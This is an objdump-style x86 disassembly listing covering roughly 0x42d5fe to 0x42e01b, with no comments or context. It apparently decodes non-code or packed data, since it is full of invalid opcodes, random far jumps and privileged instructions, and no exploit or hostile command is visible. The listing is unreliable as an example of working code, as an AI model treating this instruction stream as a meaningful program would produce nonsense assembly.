  42d5fe:	adc    cl,cl
  42d600:	dec    edx
  42d601:	hlt    
  42d602:	call   0x567:0xeda0ae2c
  42d609:	loopne 0x42d60d
  42d60b:	mov    ds:0x6d2007db,al
  42d610:	lods   eax,DWORD PTR ds:[esi]
  42d611:	mov    cl,0x63
  42d613:	mov    eax,ds:0x40834160
  42d618:	int3   
  42d619:	sub    BYTE PTR [eax+0x17],0x71
  42d61d:	and    dl,BYTE PTR [eax-0x47]
  42d620:	add    eax,0x9ff76bb2
  42d625:	dec    ebx
  42d626:	ret    
  42d627:	sub    BYTE PTR [eax-0x66],al
  42d62a:	xor    al,0x9
  42d62c:	xor    eax,0x9b193cc5
  42d631:	or     BYTE PTR [eax-0xd],cl
  42d634:	retf   
  42d635:	dec    edx
  42d636:	stc    
  42d637:	jmp    0xa4d9ca9a
  42d63c:	in     eax,0xcd
  42d63e:	sub    BYTE PTR [eax],ah
  42d640:	(bad)  
  42d641:	pop    esp
  42d642:	outs   dx,DWORD PTR ds:[esi]
  42d643:	pop    ds
  42d644:	jmp    0xd58:0x9ed40ab3
  42d64b:	push   esp
  42d64c:	xchg   ebp,eax
  42d64d:	or     BYTE PTR [ebx+eiz*1],0x8f
  42d651:	ss aad 0x63
  42d654:	jg     0x42d5ff
  42d656:	js     0x42d5dd
  42d658:	cli    
  42d659:	cmp    BYTE PTR [esp+eax*4-0x4599bc8a],0xc0
  42d661:	pusha  
  42d662:	jo     0x42d647
  42d664:	jg     0x42d64f
  42d666:	pop    ss
  42d667:	inc    edx
  42d668:	dec    ecx
  42d669:	pushf  
  42d66a:	ret    
  42d66b:	call   0x710c:0x93a9df3c
  42d672:	test   BYTE PTR [ecx+0x77],0x4
  42d676:	aad    0x6a
  42d678:	adc    al,0x91
  42d67a:	in     eax,0x78
  42d67c:	add    BYTE PTR [edi+eax*4],ah
  42d67f:	fmul   DWORD PTR [eax]
  42d681:	cmp    BYTE PTR [esp+ecx*4+0x5647f38b],ah
  42d688:	xchg   BYTE PTR ds:0x87842d8,dh
  42d68e:	and    BYTE PTR [ebx],dl
  42d690:	jg     0x42d692
	...
  42d6f2:	add    BYTE PTR [eax],al
  42d6f4:	repz add esp,DWORD PTR [eax]
  42d6f7:	(bad)  
  42d6f8:	lock scas eax,DWORD PTR es:[edi]
  42d6fa:	(bad)  
  42d6fb:	jg     0x42d67e
  42d6fd:	in     al,0x2c
  42d6ff:	and    al,0x37
  42d701:	lock (bad) 
  42d703:	xor    ch,BYTE PTR [edi+eiz*8]
  42d706:	add    DWORD PTR [eax],eax
  42d708:	add    eax,0xba000001
  42d70d:	add    al,0x4
  42d70f:	lods   eax,DWORD PTR ds:[esi]
  42d710:	outs   dx,DWORD PTR ds:[esi]
  42d711:	stos   DWORD PTR es:[edi],eax
  42d712:	fild   DWORD PTR [ebx]
  42d714:	bound  esi,QWORD PTR [ecx-0x74]
  42d717:	and    eax,0xb9daa1ce
  42d71c:	retf   0x778f
  42d71f:	(bad)  
  42d720:	sti    
  42d721:	adc    DWORD PTR [ecx-0x4d2aa577],ebp
  42d727:	(bad)  
  42d728:	stos   DWORD PTR es:[edi],eax
  42d729:	aas    
  42d72a:	fsubr  DWORD PTR [ebx+0x20]
  42d72d:	sbb    DWORD PTR [edx+0x59],edi
  42d730:	sbb    BYTE PTR [esi],dl
  42d732:	or     BYTE PTR [esi-0x88169a5],0x3f
  42d739:	adc    bl,BYTE PTR [esi+0x6e4d485b]
  42d73f:	in     eax,dx
  42d740:	push   ds
  42d741:	inc    ebx
  42d742:	xor    eax,0xb9d46bfe
  42d747:	sub    BYTE PTR [edi],ah
  42d749:	push   esi
  42d74a:	mov    ecx,0x44c71d17
  42d74f:	out    dx,al
  42d750:	mov    ds:0x2e4ad601,eax
  42d755:	mov    esp,0x9c9a3573
  42d75a:	shl    DWORD PTR [esi-0x5c],0x93
  42d75e:	clc    
  42d75f:	scas   eax,DWORD PTR es:[edi]
  42d760:	mov    eax,0x8be07b8e
  42d765:	mov    ch,0x56
  42d767:	or     eax,0xbb6ce99e
  42d76c:	push   ebp
  42d76d:	inc    edi
  42d76e:	jne    0x42d744
  42d770:	inc    eax
  42d771:	push   0x9e5b3ebf
  42d776:	xchg   ebx,eax
  42d777:	and    DWORD PTR [ebx+0x169dbd5d],ebx
  42d77d:	sub    eax,0xd06bfd2f
  42d782:	sbb    dl,BYTE PTR [edx+esi*4+0xc]
  42d786:	add    al,0xf
  42d788:	sub    dl,BYTE PTR [edi+edi*2]
  42d78b:	aad    0x12
  42d78d:	and    DWORD PTR [esi+0x43124aec],0x30
  42d794:	add    BYTE PTR [eax-0x1a],cl
  42d797:	(bad)  
  42d798:	cdq    
  42d799:	jge    0x42d752
  42d79b:	xchg   edx,eax
  42d79c:	add    al,0xc9
  42d79e:	mov    edx,0x5f601f39
  42d7a3:	je     0x42d7bc
  42d7a5:	inc    edx
  42d7a6:	mov    dh,0x61
  42d7a8:	iret   
  42d7a9:	xchg   ebx,eax
  42d7aa:	xchg   ecx,eax
  42d7ab:	jle    0x42d7d2
  42d7ad:	add    eax,0xa942d589
  42d7b2:	inc    esp
  42d7b3:	or     al,0xf7
  42d7b5:	(bad)  
  42d7b7:	call   0x33659da
  42d7bc:	or     esp,DWORD PTR [edi-0x19809f1f]
  42d7c2:	fisubr WORD PTR [edx]
  42d7c4:	push   ebp
  42d7c5:	clc    
  42d7c6:	cdq    
  42d7c7:	and    ah,ah
  42d7c9:	nop
  42d7ca:	lea    eax,[ecx]
  42d7cc:	xlat   BYTE PTR ds:[ebx]
  42d7cd:	or     ebp,DWORD PTR [ebx+0x6f]
  42d7d0:	xchg   esp,eax
  42d7d1:	std    
  42d7d2:	popa   
  42d7d3:	fimul  WORD PTR [edx+ecx*8+0x11]
  42d7d7:	dec    esi
  42d7d8:	sub    edx,DWORD PTR [edx+0x31]
  42d7db:	int3   
  42d7dc:	and    eax,0x1298362a
  42d7e1:	shl    DWORD PTR [esi-0x63],0x9c
  42d7e5:	aas    
  42d7e6:	pop    edx
  42d7e7:	lock jnp 0x42d7cd
  42d7ea:	std    
  42d7eb:	mov    ?,WORD PTR [edi+0x10833cba]
  42d7f1:	dec    edx
  42d7f2:	mov    dl,0x4c
  42d7f4:	cs xchg ebx,eax
  42d7f6:	jne    0x42d82b
  42d7f8:	fisub  WORD PTR [eax+0x3]
  42d7fb:	dec    ebp
  42d7fc:	inc    esi
  42d7fd:	mov    ds:0xebb62934,eax
  42d802:	mov    DWORD PTR [eax-0x444cd8e2],esi
  42d808:	sahf   
  42d809:	stos   DWORD PTR es:[edi],eax
  42d80a:	jecxz  0x42d78f
  42d80c:	jle    0x42d7f4
  42d80e:	mov    esp,0x3970
	...
  42d873:	add    BYTE PTR [esi-0x62a06765],dl
  42d879:	pop    edi
  42d87a:	xlat   BYTE PTR ds:[ebx]
  42d87b:	fistp  DWORD PTR ds:0x6fc6961a
  42d881:	push   es
  42d882:	inc    esi
  42d883:	sahf   
  42d884:	xor    eax,ebp
  42d886:	add    DWORD PTR [eax],eax
  42d888:	add    eax,0xed000001
  42d88d:	ror    BYTE PTR ds:0xa746fd84,0x3a
  42d894:	retf   
  42d895:	jle    0x42d86f
  42d897:	(bad)  
  42d898:	push   ss
  42d899:	daa    
  42d89a:	je     0x42d84f
  42d89c:	inc    ebx
  42d89d:	and    eax,0x75c12c41
  42d8a2:	retf   0x7d5d
  42d8a5:	sbb    DWORD PTR [eax+0x4d1b924a],esi
  42d8ab:	test   al,0x58
  42d8ad:	cld    
  42d8ae:	pushf  
  42d8af:	jb     0x42d87f
  42d8b1:	cmp    dh,dl
  42d8b3:	adc    BYTE PTR [ebx+0x55d40c62],al
  42d8b9:	jle    0x42d842
  42d8bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d8bc:	push   esi
  42d8bd:	xchg   ecx,eax
  42d8be:	mov    eax,0x9e8dc6a9
  42d8c3:	nop
  42d8c4:	test   DWORD PTR [ebp+0x3aec1197],esp
  42d8ca:	stos   BYTE PTR es:[edi],al
  42d8cb:	sti    
  42d8cc:	stos   DWORD PTR es:[edi],eax
  42d8cd:	lods   eax,DWORD PTR ds:[esi]
  42d8ce:	shr    DWORD PTR [edi+0x1b5a5e73],0x6a
  42d8d5:	adc    al,0x71
  42d8d7:	and    DWORD PTR [eax+0x4f],eax
  42d8da:	pop    ebx
  42d8db:	adc    DWORD PTR [ecx],esi
  42d8dd:	mov    ah,0x6d
  42d8df:	adc    eax,0xc71f9c17
  42d8e4:	in     eax,0x4e
  42d8e6:	or     eax,0x81bf2d02
  42d8eb:	mov    edx,0xed69076d
  42d8f0:	fisub  DWORD PTR [esi+0x47a6caf2]
  42d8f6:	je     0x42d8f6
  42d8f8:	push   cs
  42d8f9:	pop    ds
  42d8fa:	into   
  42d8fb:	adc    BYTE PTR [eax-0x5e],dh
  42d8fe:	stos   DWORD PTR es:[edi],eax
  42d8ff:	sbb    DWORD PTR [esi+0xebc19d2],edx
  42d905:	scas   al,BYTE PTR es:[edi]
  42d906:	push   edi
  42d907:	(bad)
  42d90b:	(bad)  
  42d90c:	popa   
  42d90d:	mov    WORD PTR [edx],fs
  42d90f:	mov    ebp,0x38b14087
  42d914:	push   esi
  42d915:	stos   DWORD PTR es:[edi],eax
  42d916:	loop   0x42d8b9
  42d918:	push   ss
  42d919:	aaa    
  42d91a:	mov    ebx,0x17d6cc6f
  42d91f:	add    al,0x43
  42d921:	adc    eax,DWORD PTR [eax-0x1f4126dc]
  42d927:	pop    es
  42d928:	repz cwde 
  42d92a:	mov    dl,0x12
  42d92c:	(bad)  
  42d92d:	fistp  WORD PTR [edi+edi*2-0x49]
  42d931:	pop    ebp
  42d932:	xchg   ebp,eax
  42d933:	sbb    esi,esi
  42d935:	das    
  42d936:	sbb    al,0x7c
  42d938:	push   cs
  42d939:	cmp    eax,0x99f873e6
  42d93e:	int3   
  42d93f:	push   ebx
  42d940:	aam    0xa9
  42d942:	fisub  WORD PTR [edx]
  42d944:	jp     0x42d8f9
  42d946:	sbb    ebx,DWORD PTR [esi+esi*8-0x9]
  42d94a:	push   ecx
  42d94b:	shl    DWORD PTR [eax],0xcb
  42d94e:	imul   ecx,DWORD PTR [ebx+0x28],0x76190b18
  42d955:	add    DWORD PTR ds:[edx+0x1d8abbe3],edi
  42d95c:	sbb    bl,BYTE PTR [ebx-0xfee25e8]
  42d962:	iret   
  42d963:	and    DWORD PTR [eax],esp
  42d965:	popf   
  42d966:	inc    ebp
  42d967:	test   dl,dh
  42d969:	cmp    edx,DWORD PTR [edi+0x79]
  42d96c:	inc    edi
  42d96d:	xchg   edi,eax
  42d96e:	mov    al,0x77
  42d970:	xor    DWORD PTR [eax-0x30],esp
  42d973:	add    eax,0xf8ff6913
  42d978:	mov    bl,0x3a
  42d97a:	stos   BYTE PTR es:[edi],al
  42d97b:	mov    al,0x99
  42d97d:	sbb    ecx,0x11
  42d980:	outs   dx,BYTE PTR ds:[esi]
  42d981:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d982:	fwait
  42d983:	inc    edx
  42d984:	dec    edx
  42d985:	mov    ecx,0xdf1b4a8d
  42d98a:	cmc    
  42d98b:	imul   ecx,DWORD PTR [eax-0xab0822a],0x0
	...
  42d9f1:	add    BYTE PTR [eax],al
  42d9f3:	add    cl,bh
  42d9f5:	mov    cl,0x70
  42d9f7:	dec    eax
  42d9f8:	js     0x42d9c3
  42d9fa:	stc    
  42d9fb:	mov    cl,0xbf
  42d9fd:	dec    edi
  42d9fe:	int    0xe1
  42da00:	test   al,0x31
  42da02:	sbb    dh,BYTE PTR [edx+0x36]
  42da05:	jmp    0x147da0b
  42da0a:	add    BYTE PTR [eax],al
  42da0c:	cmp    ebp,DWORD PTR [ebp+ecx*4+0x79010f40]
  42da13:	(bad)  
  42da14:	pop    ds
  42da15:	adc    eax,0xcc664db6
  42da1a:	cmp    DWORD PTR [esi],eax
  42da1c:	xchg   edx,eax
  42da1d:	add    al,ah
  42da1f:	lods   eax,DWORD PTR ds:[esi]
  42da20:	jno    0x42d9b0
  42da22:	imul   ecx,ecx,0xffffff9d
  42da25:	jmp    0xb6f9ebe6
  42da2a:	addr16 ss or eax,0x25a5ca8f
  42da31:	xchg   ebx,eax
  42da32:	leave  
  42da33:	jp     0x42da3a
  42da35:	(bad)  
  42da36:	sbb    esi,ebp
  42da38:	push   ss
  42da39:	dec    esi
  42da3a:	xor    edx,DWORD PTR [esi]
  42da3c:	ret    
  42da3d:	not    DWORD PTR [edx+0x690f1459]
  42da43:	rcl    DWORD PTR [edi+0x77],0x97
  42da47:	cmp    dl,dl
  42da49:	imul   esi,DWORD PTR [ecx-0x25aef342],0x23
  42da50:	jmp    DWORD PTR [edx+0x6f8e5ca8]
  42da56:	mov    cl,0x70
  42da58:	adc    ah,bh
  42da5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42da5b:	cli    
  42da5c:	mov    ebx,0x101a1bb2
  42da61:	inc    esi
  42da62:	nop    DWORD PTR [ecx]
  42da65:	sbb    bl,BYTE PTR [edi+ebp*4+0x36]
  42da69:	jnp    0x42da55
  42da6b:	fpatan 
  42da6d:	jns    0x42da31
  42da6f:	mov    dl,0x1d
  42da71:	mov    DWORD PTR [ebx-0x60],ebp
  42da74:	xchg   DWORD PTR [ebp+0x5b9c86ee],esp
  42da7a:	scas   al,BYTE PTR es:[edi]
  42da7b:	out    dx,eax
  42da7c:	fs pop edx
  42da7e:	and    DWORD PTR [ecx],esp
  42da80:	add    edx,DWORD PTR [edi+0x6f]
  42da83:	repz push cs
  42da85:	das    
  42da86:	push   edi
  42da87:	push   0xffffffb7
  42da89:	(bad)
  42da8c:	les    ecx,FWORD PTR [eax-0x25ba1fea]
  42da92:	jl     0x42daeb
  42da94:	mov    ds:0x2d4fb08f,al
  42da99:	cld    
  42da9a:	pop    esp
  42da9b:	xor    DWORD PTR [edi],ebx
  42da9d:	gs aaa 
  42da9f:	cmp    eax,eax
  42daa1:	sar    DWORD PTR [edi-0x46],cl
  42daa4:	mov    ebp,0x14fafac
  42daa9:	dec    ebx
  42daaa:	mul    esi
  42daac:	ret    0xd6b6
  42daaf:	xchg   esp,eax
  42dab0:	push   0x7fa10a7d
  42dab5:	fcmovu st,st(6)
  42dab7:	cdq    
  42dab8:	ror    DWORD PTR [eax],1
  42daba:	arpl   WORD PTR [edx],bp
  42dabc:	jecxz  0x42db3a
  42dabe:	xor    al,0xe
  42dac0:	mov    cl,0x4c
  42dac2:	dec    esp
  42dac3:	(bad)  
  42dac4:	imul   ch
  42dac6:	jo     0x42db29
  42dac8:	inc    ebp
  42dac9:	push   esp
  42daca:	out    dx,eax
  42dacb:	arpl   WORD PTR [ebp+0x29845c10],bp
  42dad1:	inc    ebp
  42dad2:	jo     0x42db36
  42dad4:	sub    BYTE PTR [ebx+eax*1+0x2cbf4ee5],ah
  42dadb:	jmp    0x4be5:0xfdfb90ba
  42dae2:	jne    0x42daf3
  42dae4:	imul   ebp,esp,0xffffffec
  42dae7:	loop   0x42dada
  42dae9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42daea:	imul   esp,DWORD PTR [edx-0x6b903018],0xa21e57dc
  42daf4:	inc    ebx
  42daf5:	mov    al,ds:0x11ebf8c3
  42dafa:	mov    WORD PTR [edi-0xf],es
  42dafd:	add    al,0xfb
  42daff:	lods   al,BYTE PTR ds:[esi]
  42db00:	and    bh,BYTE PTR [esi]
  42db02:	xor    BYTE PTR [ebx+0x3b],cl
  42db05:	jle    0x42db41
  42db07:	cdq    
  42db08:	nop
  42db09:	push   eax
  42db0a:	jmp    0x597d:0x1f70e652
	...
  42db71:	add    BYTE PTR [eax],al
  42db73:	add    BYTE PTR [eax-0x2093e086],dh
  42db79:	ins    DWORD PTR es:[edi],dx
  42db7a:	repz (bad) 
  42db7c:	fwait
  42db7d:	jns    0x42db1a
  42db7f:	jns    0x42db40
  42db81:	fs aas 
  42db83:	pop    esp
  42db84:	cmp    ebp,edx
  42db86:	add    DWORD PTR [eax],eax
  42db88:	add    eax,0x34000001
  42db8d:	sbb    BYTE PTR [edi],dh
  42db8f:	sub    al,0x32
  42db91:	icebp  
  42db92:	cdq    
  42db93:	(bad)  
  42db95:	add    ebx,ebx
  42db97:	shl    al,cl
  42db99:	fst    DWORD PTR [ebx+0x2c]
  42db9c:	jl     0x42db8c
  42db9e:	in     eax,0xaf
  42dba0:	shr    BYTE PTR [edx],0xe2
  42dba3:	adc    bh,ch
  42dba5:	jp     0x42db42
  42dba7:	lahf   
  42dba8:	or     cl,BYTE PTR [edx+0x4e3c9907]
  42dbae:	je     0x42dc26
  42dbb0:	adc    eax,0xebd12dd4
  42dbb5:	jae    0x42dc1e
  42dbb7:	mov    ch,0x3f
  42dbb9:	adc    BYTE PTR [eax],ch
  42dbbb:	mov    esp,ebp
  42dbbd:	sahf   
  42dbbe:	adc    dl,BYTE PTR [edx-0x82e733b]
  42dbc4:	jge    0x42dc2f
  42dbc6:	xchg   ebx,eax
  42dbc7:	out    dx,al
  42dbc8:	sbb    bh,BYTE PTR [ecx-0x2f]
  42dbcb:	out    dx,al
  42dbcc:	inc    esp
  42dbcd:	nop
  42dbce:	jae    0x42dbaf
  42dbd0:	cmp    al,0xf
  42dbd2:	xor    BYTE PTR [ebx+0x3edd556f],dl
  42dbd8:	mov    bl,0x1f
  42dbda:	pop    ss
  42dbdb:	arpl   WORD PTR [ecx-0x35],si
  42dbde:	aas    
  42dbdf:	iret   
  42dbe0:	xchg   ebx,eax
  42dbe1:	daa    
  42dbe2:	out    dx,eax
  42dbe3:	cdq    
  42dbe4:	lea    esi,[eax]
  42dbe6:	cmp    al,0x7a
  42dbe8:	mov    BYTE PTR [edi],dh
  42dbea:	imul   edx,esp,0xf67fb109
  42dbf0:	pusha  
  42dbf1:	push   ebx
  42dbf2:	mov    ecx,edx
  42dbf4:	arpl   WORD PTR [eax],bp
  42dbf6:	push   ecx
  42dbf7:	inc    esp
  42dbf8:	in     al,0x78
  42dbfa:	ss stc 
  42dbfc:	sub    eax,0x4d55be86
  42dc01:	mov    al,0xb
  42dc03:	ret    0x9536
  42dc06:	pusha  
  42dc07:	clc    
  42dc08:	jp     0x42dbf8
  42dc0a:	adc    ah,ah
  42dc0c:	loope  0x42dc51
  42dc0e:	xchg   esp,eax
  42dc0f:	je     0x42dc30
  42dc11:	pusha  
  42dc12:	mov    es,WORD PTR [ebp+0x72df53c4]
  42dc18:	sub    eax,0xd1d589db
  42dc1d:	(bad)  
  42dc1e:	scas   eax,DWORD PTR es:[edi]
  42dc1f:	test   eax,0x422af88e
  42dc24:	dec    ebx
  42dc25:	ss sbb eax,0x64e813b0
  42dc2b:	dec    esp
  42dc2c:	stos   DWORD PTR es:[edi],eax
  42dc2d:	mov    ecx,DWORD PTR [ebp-0x16fc6f9]
  42dc33:	fdiv   QWORD PTR [edi]
  42dc35:	ror    BYTE PTR [esi+eiz*2],1
  42dc38:	test   al,0x40
  42dc3a:	stos   BYTE PTR es:[edi],al
  42dc3b:	arpl   dx,dx
  42dc3d:	or     DWORD PTR [ebx-0x5ab724f5],eax
  42dc43:	sbb    BYTE PTR [esi-0x3b],0x45
  42dc47:	add    esp,DWORD PTR [ebp-0x4f0c2da]
  42dc4d:	jbe    0x42dccc
  42dc4f:	out    dx,eax
  42dc50:	or     eax,esp
  42dc52:	or     al,0x53
  42dc54:	fisttp WORD PTR [ebp-0x6e329ba8]
  42dc5a:	dec    ecx
  42dc5b:	mov    esi,0x7fa887a0
  42dc60:	je     0x42dce1
  42dc62:	and    DWORD PTR [esi+0x3921e496],ebp
  42dc68:	cdq    
  42dc69:	push   edx
  42dc6a:	sti    
  42dc6b:	mov    bl,0x54
  42dc6d:	inc    esi
  42dc6e:	idiv   edi
  42dc70:	inc    edi
  42dc71:	jae    0x42dcc5
  42dc73:	dec    eax
  42dc74:	mov    ebp,ebp
  42dc76:	jb     0x42dc28
  42dc78:	rcl    esi,0x2c
  42dc7b:	call   0x944ca900
  42dc80:	or     al,0xb2
  42dc82:	xor    BYTE PTR [esi+edi*2],dl
  42dc85:	pop    ebp
  42dc86:	fst    QWORD PTR [ecx+0x32eeb93b]
  42dc8c:	mov    esp,0x985664c7
	...
  42dcf1:	add    BYTE PTR [eax],al
  42dcf3:	add    BYTE PTR [ecx],bh
  42dcf5:	mov    bh,0x6d
  42dcf7:	pxor   mm3,mm7
  42dcfa:	jnp    0x42dcb3
  42dcfc:	adc    BYTE PTR [eax],ch
  42dcfe:	jne    0x42dce6
  42dd00:	rcr    BYTE PTR [edx-0x14bfecd7],0x1
  42dd07:	add    BYTE PTR ds:0x38000001,al
  42dd0d:	pop    ebp
  42dd0e:	mov    edx,0x17a9e3a0
  42dd13:	hlt    
  42dd14:	popf   
  42dd15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42dd16:	push   edx
  42dd17:	call   0x1b26:0x83c6c4a
  42dd1e:	sub    al,0xb8
  42dd20:	dec    eax
  42dd21:	lds    eax,FWORD PTR [ebp-0x35]
  42dd24:	xchg   ecx,eax
  42dd25:	xor    esi,ecx
  42dd27:	xor    BYTE PTR [ecx],dl
  42dd29:	retf   0xac45
  42dd2c:	cld    
  42dd2d:	jb     0x42dda5
  42dd2f:	ss inc eax
  42dd31:	fst    DWORD PTR [edx-0x523258d2]
  42dd37:	add    ebp,DWORD PTR [eax+0x2e]
  42dd3a:	xchg   edx,eax
  42dd3b:	jnp    0x42dd03
  42dd3d:	out    dx,eax
  42dd3e:	cmp    ecx,esi
  42dd40:	in     eax,0x67
  42dd42:	jmp    0x2e9a:0x2f35274d
  42dd49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42dd4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dd4b:	es pop esp
  42dd4d:	push   0x37a2ebae
  42dd52:	(bad)  
  42dd53:	pop    ebx
  42dd54:	(bad)  
  42dd56:	mov    cl,0x4f
  42dd58:	mov    edx,0x48e5ea95
  42dd5d:	push   cs
  42dd5e:	push   ds
  42dd5f:	cld    
  42dd60:	add    al,0x58
  42dd62:	test   DWORD PTR [ecx+0x636431d0],eax
  42dd68:	push   0xffffff9b
  42dd6a:	ffreep st(5)
  42dd6c:	retf   
  42dd6d:	xchg   edx,eax
  42dd6e:	imul   edx,edx,0xbbbf58ab
  42dd74:	sub    ch,BYTE PTR [ebp-0x67735ddb]
  42dd7a:	ss gs push cs
  42dd7d:	mov    dh,0xcc
  42dd7f:	ja     0x42dd0c
  42dd81:	push   ebx
  42dd82:	xor    eax,DWORD PTR [ebp+eax*2+0x5b]
  42dd86:	push   ecx
  42dd87:	and    al,0x2c
  42dd89:	and    al,0x9
  42dd8b:	mov    ebp,0x3d90ab0b
  42dd90:	cld    
  42dd91:	retf   
  42dd92:	add    BYTE PTR [edx-0x33],ah
  42dd95:	mov    ebx,0xaf6e09eb
  42dd9a:	push   ebx
  42dd9b:	call   0xfebf:0xbc1eec9e
  42dda2:	xor    esi,edi
  42dda4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42dda5:	enter  0xc716,0x62
  42dda9:	gs inc edx
  42ddab:	and    eax,0x2ba156b5
  42ddb0:	jo     0x42de2b
  42ddb2:	push   0x4
  42ddb4:	gs jmp 0x1da8:0x994381fd
  42ddbc:	je     0x42ddb2
  42ddbe:	es xchg edi,eax
  42ddc0:	pop    ebp
  42ddc1:	sbb    BYTE PTR [edi-0x762a6645],0xa0
  42ddc8:	xor    edi,esi
  42ddca:	jne    0x42dd70
  42ddcc:	gs ss test al,0xea
  42ddd0:	adc    al,0x76
  42ddd2:	ins    BYTE PTR es:[edi],dx
  42ddd3:	jg     0x42dd80
  42ddd5:	call   0xcbb89402
  42ddda:	imul   ebx,DWORD PTR [eax-0x658bfdfc],0xfffffffb
  42dde1:	pop    ds
  42dde2:	repz pop ds
  42dde4:	sbb    BYTE PTR [ecx+0x280abf4b],ch
  42ddea:	jmp    0x152d:0x646b59b3
  42ddf1:	lods   eax,DWORD PTR ds:[esi]
  42ddf2:	leave  
  42ddf3:	push   ecx
  42ddf4:	invd   
  42ddf6:	fiadd  DWORD PTR [ebx-0x73b55737]
  42ddfc:	sbb    eax,0xb700222a
  42de01:	jne    0x42de30
  42de03:	xor    DWORD PTR [esi-0x41f6b1fc],edx
  42de09:	ja     0x42de49
  42de0b:	add    eax,esi
  42de0d:	or     al,0xf5
  42de0f:	fdivrp st(7),st
	...
  42de71:	add    BYTE PTR [eax],al
  42de73:	add    dh,ah
  42de75:	sub    BYTE PTR [ebp-0x1c012cd],0xd7
  42de7c:	fist   DWORD PTR [ebp-0x79]
  42de7f:	das    
  42de80:	push   cs
  42de81:	add    bl,BYTE PTR [ebx]
  42de83:	xchg   esp,eax
  42de84:	inc    ebp
  42de85:	in     al,dx
  42de86:	add    DWORD PTR [eax],eax
  42de88:	add    eax,0x98000001
  42de8d:	pop    ds
  42de8e:	jb     0x42decc
  42de90:	shl    esi,cl
  42de92:	dec    ecx
  42de93:	scas   eax,DWORD PTR es:[edi]
  42de94:	fistp  QWORD PTR ds:0x3751cb50
  42de9a:	(bad)  
  42de9b:	stc    
  42de9c:	das    
  42de9d:	mov    eax,0x48c9cc7e
  42dea2:	sahf   
  42dea3:	in     al,dx
  42dea4:	jg     0x42def4
  42dea6:	push   ebx
  42dea7:	pop    ss
  42dea8:	add    al,0xa5
  42deaa:	fsubrp st(4),st
  42deac:	xchg   edx,eax
  42dead:	xchg   esi,eax
  42deae:	test   DWORD PTR [esi-0x74728320],esi
  42deb4:	xchg   edx,eax
  42deb5:	xlat   BYTE PTR ds:[ebx]
  42deb6:	mov    ds:0xdaa1efe5,al
  42debb:	jp     0x42df33
  42debd:	jb     0x42de5e
  42debf:	cmp    dh,bl
  42dec1:	gs push 0xffffff94
  42dec4:	dec    ebp
  42dec5:	xchg   ebp,eax
  42dec6:	or     eax,0xa25874ab
  42decb:	rcr    BYTE PTR [ecx+0x49],1
  42dece:	xchg   ecx,eax
  42decf:	push   ecx
  42ded0:	jecxz  0x42dee8
  42ded2:	xchg   ebx,eax
  42ded3:	fimul  WORD PTR [eax-0x71]
  42ded6:	lods   al,BYTE PTR ds:[esi]
  42ded7:	retf   0x2ca0
  42deda:	jbe    0x42de65
  42dedc:	pop    edx
  42dedd:	stos   DWORD PTR es:[edi],eax
  42dede:	push   0x69b56cec
  42dee3:	sbb    DWORD PTR [esp+ebx*2],0x6384eb02
  42deea:	xor    esp,DWORD PTR [edx+0x3f]
  42deed:	call   0xaeb6a2bc
  42def2:	in     eax,dx
  42def3:	sub    edx,esp
  42def5:	jmp    0xf4be:0xa6e717e8
  42defc:	call   0x481cf363
  42df01:	outs   dx,DWORD PTR ds:[esi]
  42df02:	bound  edx,QWORD PTR [esi+0x25]
  42df05:	retf   
  42df06:	lea    edx,[edi]
  42df08:	pop    esp
  42df09:	sbb    DWORD PTR [ecx+0x5e07c122],ebp
  42df0f:	pop    edx
  42df10:	pop    ss
  42df11:	pop    esi
  42df12:	test   ah,dl
  42df14:	xchg   esi,eax
  42df15:	adc    al,0x42
  42df17:	sti    
  42df18:	fcmovnb st,st(3)
  42df1a:	cld    
  42df1b:	cmp    DWORD PTR [eax-0x2bbc83ad],edi
  42df21:	push   eax
  42df22:	push   ebp
  42df23:	pop    esp
  42df24:	sub    ch,al
  42df26:	jl     0x42dec1
  42df28:	push   ss
  42df29:	stos   BYTE PTR es:[edi],al
  42df2a:	mov    bl,0xeb
  42df2c:	pop    es
  42df2d:	inc    eax
  42df2e:	mov    eax,0x3c0a3f82
  42df33:	and    al,0xd7
  42df35:	fisub  WORD PTR [edx+0x53]
  42df38:	jl     0x42dfb4
  42df3a:	out    0xb,eax
  42df3c:	pop    esi
  42df3d:	and    edi,DWORD PTR [edi-0x3]
  42df40:	(bad)  
  42df42:	push   ebx
  42df43:	adc    DWORD PTR [ebx+0x31cd21f6],esp
  42df49:	pop    ds
  42df4a:	add    eax,0xdf4a32bc
  42df4f:	push   ds
  42df50:	inc    esi
  42df51:	inc    edx
  42df52:	mov    bh,0xd
  42df54:	or     DWORD PTR [edi],eax
  42df56:	ror    DWORD PTR [esi],cl
  42df58:	je     0x42dee7
  42df5a:	hlt    
  42df5b:	sub    BYTE PTR [ebp+0x17550404],dh
  42df61:	adc    BYTE PTR [ecx+0x74],ch
  42df64:	clc    
  42df65:	pop    ecx
  42df66:	or     eax,0xd4f267f9
  42df6b:	jmp    0x42dfb1
  42df6d:	dec    ecx
  42df6e:	mov    eax,0x9b7d28c
  42df73:	xor    DWORD PTR [edi+0x71],edx
  42df76:	xchg   esp,eax
  42df77:	jmp    0xff59:0x35a5b70b
  42df7e:	sub    edi,DWORD PTR [ebp+0x6b241c07]
  42df84:	js     0x42dfd1
  42df86:	int    0xd9
  42df88:	mov    edx,0x658decc5
  42df8d:	mov    bl,bl
  42df8f:	mov    esi,0x8e
	...
  42dff4:	add    bh,dh
  42dff6:	jb     0x42df9e
  42dff8:	(bad)  
  42dff9:	scas   al,BYTE PTR es:[edi]
  42dffa:	(bad)  
  42dffb:	dec    BYTE PTR [edi-0x30]
  42dffe:	fisttp WORD PTR [esi-0x54]
  42e001:	dec    ebx
  42e002:	adc    edx,edi
  42e004:	dec    edx
  42e005:	in     eax,dx
  42e006:	add    DWORD PTR [eax],eax
  42e008:	add    eax,0x37000001
  42e00d:	pusha  
  42e00e:	pop    ss
  42e00f:	jb     0x42e03c
  42e011:	test   al,0x76
  42e013:	or     ah,cl
  42e015:	std    
  42e016:	add    DWORD PTR ss:[ebx+0x77],ebx
  42e01a:	inc    esi
  42e01b:	ficomp DWORD PTR [ecx-0x2]
